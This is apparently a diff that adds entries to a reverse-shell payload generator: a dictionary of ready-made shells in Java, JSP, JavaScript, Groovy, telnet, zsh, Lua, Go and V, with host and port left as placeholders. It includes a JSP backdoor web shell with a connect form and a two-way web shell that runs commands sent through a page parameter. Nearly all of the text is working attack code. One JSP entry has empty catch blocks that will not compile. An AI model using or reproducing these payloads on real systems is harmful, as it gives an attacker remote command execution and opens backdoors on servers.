@@ -264,7 +264,261 @@ main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc NaN NaN
         } catch (Exception e) {}
     }
 }''',
+        "Java #2": '''public class shell {
+    public static void main(String[] args) {
+        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/NaN/NaN 0>&1")
+            .redirectErrorStream(true);
+        try {
+            Process p = pb.start();
+            p.waitFor();
+            p.destroy();
+        } catch (Exception e) {}
+    }
+}''',
+        "Java #3": '''import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.Socket;
 
+public class shell {
+    public static void main(String[] args) {
+        String host = "NaN";
+        int port = NaN;
+        String cmd = "sh";
+        try {
+            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
+            Socket s = new Socket(host, port);
+            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
+            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+            while (!s.isClosed()) {
+                while (pi.available() > 0)
+                    so.write(pi.read());
+                while (pe.available() > 0)
+                    so.write(pe.read());
+                while (si.available() > 0)
+                    po.write(si.read());
+                so.flush();
+                po.flush();
+                Thread.sleep(50);
+                try {
+                    p.exitValue();
+                    break;
+                } catch (Exception e) {}
+            }
+            p.destroy();
+            s.close();
+        } catch (Exception e) {}
+    }
+}''',
+
+        "Java Web": '''<%@
+page import="java.lang.*, java.util.*, java.io.*, java.net.*"
+% >
+<%!
+static class StreamConnector extends Thread
+{
+        InputStream is;
+        OutputStream os;
+        StreamConnector(InputStream is, OutputStream os)
+        {
+                this.is = is;
+                this.os = os;
+        }
+        public void run()
+        {
+                BufferedReader isr = null;
+                BufferedWriter osw = null;
+                try
+                {
+                        isr = new BufferedReader(new InputStreamReader(is));
+                        osw = new BufferedWriter(new OutputStreamWriter(os));
+                        char buffer[] = new char[8192];
+                        int lenRead;
+                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)
+                        {
+                                osw.write(buffer, 0, lenRead);
+                                osw.flush();
+                        }
+                }
+                catch (Exception ioe)
+                try
+                {
+                        if(isr != null) isr.close();
+                        if(osw != null) osw.close();
+                }
+                catch (Exception ioe)
+        }
+}
+%>
+
+<h1>JSP Backdoor Reverse Shell</h1>
+
+<form method="post">
+IP Address
+<input type="text" name="ipaddress" size=30>
+Port
+<input type="text" name="port" size=10>
+<input type="submit" name="Connect" value="Connect">
+</form>
+<p>
+<hr>
+
+<%
+String ipAddress = request.getParameter("ipaddress");
+String ipPort = request.getParameter("port");
+if(ipAddress != null && ipPort != null)
+{
+        Socket sock = null;
+        try
+        {
+                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());
+                Runtime rt = Runtime.getRuntime();
+                Process proc = rt.exec("cmd.exe");
+                StreamConnector outputConnector =
+                        new StreamConnector(proc.getInputStream(),
+                                          sock.getOutputStream());
+                StreamConnector inputConnector =
+                        new StreamConnector(sock.getInputStream(),
+                                          proc.getOutputStream());
+                outputConnector.start();
+                inputConnector.start();
+        }
+        catch(Exception e) 
+}
+%>''',
+        "Java Two Way": '''<%
+    /*
+     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.
+     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.
+     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button "send" is clicked, it will try to connect to the reverse shell again (apart from executing 
+     * the command specified in the HTML form). This is to avoid to keep it simple.
+     */
+%>
+
+<%@page import="java.lang.*"%>
+<%@page import="java.io.*"%>
+<%@page import="java.net.*"%>
+<%@page import="java.util.*"%>
+
+<html>
+<head>
+    <title>jrshell</title>
+</head>
+<body>
+<form METHOD="POST" NAME="myform" ACTION="">
+    <input TYPE="text" NAME="shell">
+    <input TYPE="submit" VALUE="Send">
+</form>
+<pre>
+<%
+    // Define the OS
+    String shellPath = null;
+    try
+    {
+        if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
+            shellPath = new String("/bin/sh");
+        } else {
+            shellPath = new String("cmd.exe");
+        }
+    } catch( Exception e ){}
+    // INNER HTML PART
+    if (request.getParameter("shell") != null) {
+        out.println("Command: " + request.getParameter("shell") + "\n<BR>");
+        Process p;
+        if (shellPath.equals("cmd.exe"))
+            p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("shell"));
+        else
+            p = Runtime.getRuntime().exec("/bin/sh -c " + request.getParameter("shell"));
+        OutputStream os = p.getOutputStream();
+        InputStream in = p.getInputStream();
+        DataInputStream dis = new DataInputStream(in);
+        String disr = dis.readLine();
+        while ( disr != null ) {
+            out.println(disr);
+            disr = dis.readLine();
+        }
+    }
+    // TCP PORT PART
+    class StreamConnector extends Thread
+    {
+        InputStream wz;
+        OutputStream yr;
+        StreamConnector( InputStream wz, OutputStream yr ) {
+            this.wz = wz;
+            this.yr = yr;
+        }
+        public void run()
+        {
+            BufferedReader r  = null;
+            BufferedWriter w = null;
+            try
+            {
+                r  = new BufferedReader(new InputStreamReader(wz));
+                w = new BufferedWriter(new OutputStreamWriter(yr));
+                char buffer[] = new char[8192];
+                int length;
+                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )
+                {
+                    w.write( buffer, 0, length );
+                    w.flush();
+                }
+            } catch( Exception e ){}
+            try
+            {
+                if( r != null )
+                    r.close();
+                if( w != null )
+                    w.close();
+            } catch( Exception e ){}
+        }
+    }
+ 
+    try {
+        Socket socket = new Socket( "NaN", NaN ); // Replace with wanted ip and port
+        Process process = Runtime.getRuntime().exec( shellPath );
+        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();
+        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();
+        out.println("port opened on " + socket);
+     } catch( Exception e ) {}
+%>
+</pre>
+</body>
+</html>''',
+        "javascript": '''String command = "var host = 'NaN';" +
+                       "var port = NaN;" +
+                       "var cmd = 'sh';"+
+                       "var s = new java.net.Socket(host, port);" +
+                       "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+
+                       "var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();"+
+                       "var po = p.getOutputStream(), so = s.getOutputStream();"+
+                       "print ('Connected');"+
+                       "while (!s.isClosed()) {"+
+                       "    while (pi.available() > 0)"+
+                       "        so.write(pi.read());"+
+                       "    while (pe.available() > 0)"+
+                       "        so.write(pe.read());"+
+                       "    while (si.available() > 0)"+
+                       "        po.write(si.read());"+
+                       "    so.flush();"+
+                       "    po.flush();"+
+                       "    java.lang.Thread.sleep(50);"+
+                       "    try {"+
+                       "        p.exitValue();"+
+                       "        break;"+
+                       "    }"+
+                       "    catch (e) {"+
+                       "    }"+
+                       "}"+
+                       "p.destroy();"+
+                       "s.close();";
+String x = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\""+command+"\")";
+ref.add(new StringRefAddr("x", x);''',
+        "groovy": '''String host="NaN";int port=NaN;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();''',
+        "telnet": '''TF=$(mktemp -u);mkfifo $TF && telnet NaN NaN 0<$TF | sh 1>$TF''',
+        "zsh": '''zsh -c 'zmodload zsh/net/tcp && ztcp NaN NaN && zsh >&$REPLY 2>&$REPLY 0>&$REPLY' ''',
+        "Lua #1": '''lua -e "require('socket');require('os');t=socket.tcp();t:connect('NaN','NaN');os.execute('sh -i <&3 >&3 2>&3');" ''',
+        "Lua #2": '''lua5.1 -e 'local host, port = "NaN", NaN local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()' ''',
+        "Golang": '''echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","NaN:NaN");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go''',
+        "vlang": '''echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e sh NaN NaN 0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v''',
     }
 
 
